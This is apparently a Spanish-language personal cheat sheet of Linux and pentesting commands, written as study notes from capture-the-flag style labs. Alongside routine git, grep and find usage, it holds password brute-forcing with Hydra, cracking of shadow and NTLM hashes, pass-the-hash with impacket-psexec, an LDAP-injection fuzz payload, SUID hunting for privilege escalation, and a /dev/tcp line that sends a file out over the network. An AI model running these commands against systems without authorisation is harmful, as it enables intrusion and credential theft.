---

title: Linux Command
date: 2023-07-16 07:03 +0800
categories: [Linux]
tags: [Linux, Command]
pin: false

---

Esta es una recopilación de comandos de Linux.

## <font color="#c37437">GPG</font>
#gpg #command 

```python
$> gpg --gen-key # Genera clave
$> gpg -a -o public.key --export [name] # exporta clave
$> echo 'life-time' | gpg --clear-sign # Añade texto y crea la firma
$> gpg --delete-secret-keys [ref] # Borra keys secrets
$> gpg --list-keys # Lista claves
$> gpg --delete-keys [mail] # Borra keys
```

## <font color="#c37437">DIRSEARCH</font>
#dirsearch #command 

```python
$> dirsearch -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.129.147.226:55555 -x 400 # FUZZ DIR
```

## <font color="#c37437">GPASSWD</font>
#gpasswd #command 

```python
$>  gpasswd -d [user] [group] # Elimina el grupo al usuario
```

## <font color="#c37437">TCPDUMP</font>
#tcpdump  #command 

```python
$> tcpdump -i eth0 icmp -n -w Captura.cap # Escucha de trazas "icmp" sin resolucion DNS y lo guarda en .cap
```

## <font color="#c37437">USERADD</font>
#useradd #command 

```python 
$> useradd -d /home/[nameUser] -s /bin/bash -m [nameUser] # Crea un usuario, asigna su home "-d", asigna shell y "-m" para crear el directorio home.
```

## <font color="#c37437">DIG</font>
#dig #command 

```python
$> dig ns @[host] [domain.com] # Info de nombre de servers
$> dig mx @[host] [domain.com] # Info de nombre de servers de correo
$> dig axfr @[host] [domain.com] # Info DNS full transfer
```

## <font color="#c37437">LDAPSEARCH</font>
#ldapsearch #command 

```python
$> ldapsearch -x -H ldap://localhost -b dc=example,dc=org -D "cn=admin,dc=example,dc=org" -w admin 'cn=admin' # Extrae información de la organización. El campo dc= hace referencia a la organización, otro ejemplo: dc=google,dc=com. 
```

## <font color="#c37437">TLDR</font>
#ltdr #command 

```python
$> tdr [NameSoftware] # ltdr cat, esto nos da posbles comandos para usar el programa. 
```

## <font color="#c37437">SCP</font>
#scp #command 

```python
$> scp [user]@[IP]:[DIRVictima] # Copia archivo cuando disponemos de credenciales SSH.
```

## <font color="#c37437">Curl</font>
#curl #command 

```python
$> curl -s -X POST "[URL]" -d@[file] #Esto adjunta un file a la peticion POST
```

## <font color="#c37437">Cifs</font>
#cifs #command 
```python
$> mount -t cifs //localhost/myshare /mnt/mounted -o username=null,password=null,domain=,rw# Estro crea una montura en dos directorios. 
$> umount /mnt/mounted # Elimina la montura anterior
```

## <font color="#c37437">Sslscan</font>
#sslscan #command 
```python
$> sslscan [host] # Analiza el ssl del dominio. 
```

## <font color="#c37437">Grep</font>
#grep #command 
```python
$> grep -w "String: 1" # Con "-w" se busca la cadena exacta.
$> grep -r "[cadena]" /[ruta] -n # Buscar de forma recursiva en la ruta e indica el nº de linea
```

## <font color="#c37437">Tshark</font>
#tshark #command 
```python
$> tshark -r [file.pcap] -z io,phs -q # lectura fichero .pcap resumidas con las funciones io y phs
$> tshark -Y 'http' -r [file.pcap] # filtra por http
$> tshark -r [file.pcap] -Y "ip.src==[IPOrigen] && ip.dst==[IPdestino]" # Filtra por los paquetes de la IP de origen a la Ip de destino.
$> tshark -r HTTP_traffic.pcap -Y "http.request.method==GET" # Filtra por el metodo GET, 
$> tshark -r [file.pcap] -Y "http contains password" # Filtra por paquetes con pass 
```

## <font color="#c37437">Hydra</font>
#command #hydra 
```python 
$> hydra -l [user] -P [DICC.txt] [smb,ftp,etc]:\/\/[IP] # Fuerza bruta pass
$> hydra 192.67.198.3 ssh -L users -P /usr/share/wordlists/rockyou.txt.gz -f -V # realiza fuerza bruta con los diccionarios de uuarios y contraseñas indicados
```

## <font color="#c37437">JOHN</font>
#command #john
 ```python
$> john -w:[PATH DICC] [archivo con hash]
$> john /etc/shadow --wordlist=[DICC] # rompe todos los hashes que encuenta en shadow con el diccionario indicado.
$> /usr/share/john/office2john.py MS_Word_Document.docx > hash # este .py de john nos permite crear un hash de un domumento offimatico  para despues romperlo.
$> john --format=NT [name].txt # Crackea hashes NT 
$> john --format=sha512crypt [hash.txt] --wordlist=[Path_DICC] 
```
 

## <font color="#c37437">HASHCAT</font>
#command #hashcat
```python
$> hashcat -m 1800 -a0 admin.hash [dicionario] # Crack con DICC, "-m 1800" es hash sha-512
$> hashcat -m 1000 -a3 -m 1000 [hashes.txt] /usr/share/wordlists/rockyou.txt # -m 1000 son hashes NTLM
```

## <font color="#c37437">ROUTE</font>
#command #route
```python
$> ip route add [subred] add [mask] # podemos ver otras redes o subredes.
```

## <font color="#c37437">LTRACE</font>
#command #ltrace
```python
$> ltrace [binario] # desvela información del binario.
```


## <font color="#c37437">DAVTEST</font>
#davtest #command 
```python
$> davtest -url http:\/\/10.10.10.14 # Escanea la URL para adivina las extensiones de archivos para realizar una subida
```

## <font color="#c37437">IMPACKET</font>
#impacket #command
### <font color="#fbd5b5">IMPACKET-PSEXEC</font>
#impacket-psexec #command 
```python
$> impacket-psexec WORKGROUP/[USER]@[IP]] -hashes :[c68a5a55a0e763150c9b3bd9e9b881de] # Conecta sin pass, solo con NTLM v1
$> impacket-psexec WORKGROUP/[USER]:[PASS]@[IP] # Conecta con user y pass
```
### <font color="#fbd5b5">IMPACKET-SMBSERVER</font>
#impacket-smbserver #command 
```python
$> impacket-smbserver smbFolder $(pwd) -smbsupport # Crearmos una carpeta "smbFolder" para que sea compartida mediante samba, debemos indicar el directorio a compartir, en este caso PWD indica la ruta actual.
```
 
## <font color="#c37437">Steghide</font>
#steghide #command
```python
$> steghide info [archivo] # Nos permite ver si una imagen contiene algun tipo de dato
$> steghide extract -sf [Archivo] # Nos permite extraer data oculta de una imagen mediante estenografía
$> steghide embed -cf [ArchivoImagen] -ef [ArchivoOculto] # Este comando nos permite ocultar un archivo"oculto" dentro de una imagen.
```

## <font color="#c37437">EXIFTOOL</font>
#exiftool #command #image
```python
$> exiftool [archivo]" # Nos permite ver los metadatos de una imagen.
```

## <font color="#c37437">SSH</font>
#ssh #command 
```python
$> ssh -i id_rsa www-data@10.10.10.246 -p 2222 -L 80:192.168.254.3:80 # Mediante este comando podemos jugar con el localportforwarding indicando que mi puerto 80 es el mismo que el puerto 80 de la IP indicada en el "-L"
```

## <font color="#c37437">WGET</font>
#wget #command 
```python
$> wget -qO- http://192.168.254.3 # Este comando nos permiete ver el codigo fuente de la dirección proporcionada. 
```

## <font color="#c37437">WACTH</font>
#wacth #command 
```python
$> wacth -n 1 [command] # Ejecuta el comando con la duracion de un segundo
```

## <font color="#c37437">OPENSSL</font>
#openssl #command 
```python
$> openssl s_client -connect 127.0.0.1:30001 # Esta conexion es cifrada en ssl, permite ver datos como el certificado, etc.
$> openssl passwd # Nos genera un hash valido para ser interpretado por el passwd y shadow. 
```

## <font color="#c37437">GIT</font>
#git #command 
```python
$> git init # Inicia un proyecto git en el directorio, crea ".git"
$> git status # Vemos estado de git(Rojo=file sin añadir Verde=Añadidos)
$> git add # ADD ficheros al proyecto GIT
	$> . # Añade todos los ficheros
$> git commit -m "Comment" # Realizar commit
$> git log # Log del GIT
	$> --graph # Log mas grafico
	$> --pretty=oneline # OneLine
	$> --decorate --all -one # Decoramos todo GIT en OneLine
$> git reflog # Log total, incluso vemos cambios con reset --hard
$> git checkout [file] # Deshace cambios en un fichero que aun no esta "commint" en GIT
	$> [IDcommit] # Volvemos al commit indicado (Actualiza Ficheros y contenido TODO)
	$> HEAD # Indica en el commit actual de trabajo
	$> tag/[nameTAG] # Movemos el HEAD al tag
$> git reset # Reset del GIT, descarta todos los cambios sin guardar
	$> --hard [IDcommit] # Borra todos commit hasta el indicado, tambien podemos volver a un commint borrado con la ayuda de "git reflog"
$> git diff # Vemos la diferencia de los cambios 
	$> [nameBranch] # Vemos diferencia con la rama indicada
$> git tag [nameTAG] # ADD tag al HEAD
$> git brach [nameBranch] # Crea una Branch
	$> -d [nameBranch] # Borra una rama
$> git switch [nameBranch] # Cambiamos de Branch
$> git merge [nameBranch] # Combina datos de otra rama 
	$> # Conflictos con MERGE -> la misma linea de codigo del mismo fichero es diferente, el merge dara conflicto y el fichero reflejara las dos opciones. Se resuelve y otro commit
$> git stash # Es un guardado temporal, similar a un commit pero no queda reflejado en el proyecto GIT 
	$> list # Lista los stash
	$> pop # Restablece los cambios cambiados en stash
	$> drop # Borra stash
# ------------------------------------ REMOTE -------------------------------------------
$> git remote add origin [github@github.com:r4mnx/Hello-git.git] # Vincula un repositorio local con un repositorio remoto en Git.
$> git push origin main # Sincroniza nuestro GIT local con el remoto vinculado con  remote add
$> git fetch # Obtiene cambios en el repositorio remoto sin fusionarlos a rama local
$> git pull # Obtiene cambios en el repositorio remoto y los fusiona con el local
￼```

## <font color="#c37437">TIMEOUT</font>
#timeout  #command 
```python
$> timeout 1 bash .c "[Command]" # Con el valor númerico indicamos los segundos que estará activo el comando 
```

## <font color="#c37437">WFUZZ</font>
#wfuzz #command 
```python
$> wfuzz -c -L -t 400 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://DOMINIO/FUZZ # Tirando del diccionario indicado busca posibles subdominios, si añadimos /FUZZ/FUZZ2 podemos reconocer más subdominios
$> wffuz -c --hc=404 -t 200 -w wp-plugins.fuzz.txt [Host]/FUZZ # Esto nos permite ver los plugins instalados en WP.
$> wfuzz -c -t 200 --hl=3 -z range,1-65535 "http://172.17.0.2/utility.php?url=http://127.0.0.1:FUZZ" # Ocultamos las lineas y creamos un rango de escaneo.

# -------------------- LDAP ---------------------------------------
$> wfuzz -c --hw=49 -w /usr/share/seclists/Fuzzing/LDAP-openldap-attributes.txt -d 'user_id=admin)(FUZZ=*))%00&password=*&login=1&submit=Submit' http://localhost:8888 # Enum atributos usuarios. 
```

## <font color="#c37437">NETCAT</font> 
#netcat  #command 
```python
$> nc -nlvp [PORT] >> # Se pone en escucha por el puerto indicado
$> nc [IP] [PORT] # Establece una coexión, y nos pedirá introducir una pass
$> ncat --ssl [IP] [PORT] # Establece conexión bajo el cifrado SSL.
```

## <font color="#c37437">LSOF</font>
#lsof #command 
```python
$> lsof -i:80' >> # Lista todos los procesos abiertos en el puerto indicado
```

## <font color="#c37437">PWDX</font>
#pwdx #command 
```python
$> pwdx [pid proceso] # Nos indica desde donde ha empezado el proceso
```

## <font color="#c37437">STTY TTY</font>
#stty #tty #command 
```python
$> script /dev/null -c bash
$> ^Z
$> stty raw -echo; fg
$> -> reset
$> -> xterm
$> export TERM=xterm
$> export SHELL=bash
$> stty -a
```

## <font color="#c37437">NETSTAT</font>
#netstat #command 
```python
$> netstat -nat # Escanea todos los puertos en uso del sistema
$> netstat -tunp # Escanea los puetos que estan escuchando
```

## <font color="#c37437">SS</font>
#ss #command 
```python
$> ss -nltp' # Escanea todos los puertos en uso del sistema
```


## <font color="#c37437">XXD</font> 
#xxd #command 
```python
$> xxd # Convierte una cadena a hexadecimal
$> xxd -ps # Agrupa la data 
$> xxd -r # "Reverse, convierte hexadecimal a texto claro"
```

## <font color="#c37437">WC</font>
#wc #command 
```python
$> wc -l o wc -c  # Nos indica cuantas lineas o cuantos caracteres tiene un archivo. 
```

## <font color="#c37437">AWK</font>
#awk #command 
```python
$> awk '{print $2}' # En este caso nos imprime el segundo argumento
$> awk 'NF{print $NF}' # Print del ultimo argumento
$> awk "/[dato1]/,/[dato2]/" # Esto representa que me muuestre desde dato1 a dato2
```

## <font color="#c37437">TR</font>
#tr #command #rot13
```python
$>  tr ' ' '\n' # Tr sustituye en este caso espacion por saltos de linea sustituye 'caracter' por 'caracter'

```

## <font color="#c37437">BASH</font>
#bash #command 
```python
$> bash -c "echo '' > /dev/tcp/127.0.0.1/30" 2>/dev/null # Hay comandos que hay que englobarlos dentro de un bash -c "" para que no den errores.
```

## <font color="#c37437">PS</font>
#ps #command 
```python
$> ps -eo comand # Lista los procesos del sistema
$> ps -faux # Escanea todos los procesos abiertos "PID"
```
## <font color="#c37437">CAT</font>
#cat #command 
```python
$> cat  o cat $(pwd)/$> >> #  Escapa "$>  Caracteres especiales como "$>  necesitan de un trato especial para trabajar con ellos. Puedes tambien tirar de ruta absoluta. 
$> cat datos\ bancarios\ año\ 1.txt # Escapar "espacio"Esto es una forma para reconocer los espacios del nombre de un archivo, lo más comun es poner las iniciales, tabular, "" entrecomillar todo el nombre del archivo, caracteres* (sp* o *ame o *this*). Los astericos indican que algo* y hay mas data
$> cat [file] | head -n 1 | tail -n 2 | awk 'NR= =1' #  Formatea el output y saca el lineas desde el head o con tail desde el final y con awk saca la linea indicada  
$> cat [file] | sed 's/datoAremplazar/datoRemplazado/g' # Con sed podemos remplazar datos del output indicando "s/" mas datos a remplazar, con /g al final hacemos que se realize los cambios en todo el output, si no lo podemos, solo realizara el cambio de la primera coincidencia.
$> cat [file] | grep "^dato" # Esto hace un grep de los caracteres "dato" pero lo podriamos encontrar en otros contextos como subdato, datografo, etc. Con ^ indicamos que la plabra tiene que iniciarse con el caracter indicado, en este caso con la d ^ dato.
$> cat data.txt | sort | uniq -u # Sort ordena lineas iguales y uniq -u elimina repeticiones

# -------------------- cat > nc ------------------
# Transferir archivos con ayuda del CAT.
$> nc -nlvp 443 | cat -l php
	$> cat < [file].php > /dev/tcp/[miIP/443] # Mediante NC interpretamos el cat con PHP. 
$> md5sum [file] # Podemos comprobar la integridad del archivo con este comando en origen y destino.
```

## <font color="#c37437">UNIQ</font>
#uniq #command 
```python
$> uniq -u # Representa cadenas unicas
$> uniq -ic # Representa el numero de veces que se repite 
$> uniq -i # Muestra unicamente las lineas duplicadas
```

## <font color="#c37437">ECHO</font>
#echo #command 
```python
$> echo $? >> # Esto nos indica el codigo de estado del comando anterior.
$> echo "fGrHPx402xGC7U7rXKDaxiWFTOiF0ENq" | nc localhost 30000 # Esta seria una forma de enviar data a un servicio
```

## <font color="#c37437">DESCRIPTORES de archivos </font>
#descriptores #command #decriptor
- *STDOUT* >> # El stout se referencia con el 1, es el output de cualquier comando exitoso.
- *STDERR* >> # Se referencia con el 2, y es los codigos de error de una ejecución
- *STDIN* >> # Es output de información de una ejecución.  
```python
$> exec 4<> "NombreFile" # Esto crea un fichero el cual luego podemos redirigir el output a este con "command >&4, el simbolo <> indica que le damos permisos de escritura y lectura"
$> exec 4>& # Esto borra el descriptor de archivos pero no borra el fichero creado ni su contenido 
$> exec 4>&3" >> # Esto nos crea una copia del descriptor de archivos 3, si añadimos al final "
$>  crea la copia pero elimina el descriptor 3
- Forma de mandar data a descriptores:
	$> command 2>/dev/null # 2 hace referencia al "STDER" o al codigo de estado de error, y con > lo redirigimos al "/dev/null"
	$> command > /dev/null 2>&1 o command &>/dev/null # Esto lo que hace es redirigir el "STDIR" y "STDER" al dev/null. El STDIN no son mensaje de errores, es como información del proceso de la ejecución del comando.

```

## <font color="#c37437">FIND</font>
#find #command 
```python
$> find / -name [nameFile/Dir] # Aquí buscar ficheros desde la raiz con el nombre indicado, pero también podemos buscar "-perm" permisos, "-group" grupos, "-user", "-type f/d/..." tipo de fichero con f, d u otra selecianos el tipo, etc.
$> find . -type f -readable ! -executable -size 1033c | xargs cat | sed 's/^ ￼//g' # Con -type f -readable ! -executable -size 1033c indicamos que tenga encuenta el tipo de fichero que sea legible y NO ejecutable por el "! , es todo lo contratio"  y que tenga en cuenta el peso del archivo, "c" al final indica "bytes". La parte de sed 's/^ ￼//g' indica que s/ sustituya ^ * espacio por nada//, y con g que lo haga en todo el output.
$> find /[test.txt] | xargs cat # xargs pipeado dentro de un comando, realiza una ejecucion paralela a nivel de sistema.
$> find [RUTA] -type f -printf "f\t%p\t%u\t%g\t%m\n" | column -t # Esto es una forma para buscar contenido de una ruta, con find buscamos, -type indica el tipo de fichero, con printf indicamos la forma de sacar el output: 
	$> printf:
		$> "%f" # Muestra archivos
		$> "t%p" # Muestra de forma tabulada muestra la ruta absoluta
		$> "t%u" # De forma tab muestra usuario propietario
		$> "t%g" # De forma tab muestra privilegios asignados
		$> "t%m" # De forma tab muestra el permiso numerico
$> comlun -t >> # Aunque hemos ordenado con tab, con esto ordenamos por columnas
$> time find / -user bandit7 -group bandit6 -size 33c 2>/dev/null | xargs cat 2>/dev/null  # Con -user y -group indicamos usuario y grupo de usuarios en la busqueda
```

### <font color="#c37437">Escalation Linux</font>
#find #escalation  #linux
```python 
$> find / -perm -4000 -ls 2>/dev/null # Podemos ver binarios SUID
$> find / -writable 2>/dev/null # Archivos con permisos de escritura
```

